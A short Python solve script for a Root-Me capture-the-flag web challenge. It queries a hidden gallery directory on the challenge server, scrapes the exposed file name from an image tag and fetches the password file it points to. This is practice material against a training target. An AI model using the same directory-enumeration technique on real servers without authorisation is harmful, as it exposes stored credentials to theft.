import requests
from bs4 import BeautifulSoup
import re

session = requests.Session()
url = 'http://challenge01.root-me.org/web-serveur/ch15'

r = requests.get(url+'/ch15.php', params= {'galerie':'86hwnX2r'})
soup = BeautifulSoup(r.text,'html.parser')
img_tags = soup.find_all('img')
if img_tags:   
    str1 = img_tags[0].get('src')   #galerie/86hwnX2r/password.txt
    match = re.search(r'galerie/86hwnX2r/(.+)', str1)
    str1 = match.group(1)   #password.txt
url += '/galerie/86hwnX2r/'+ str1
print('url: ',url)
r = requests.get(url)
print(r.text)

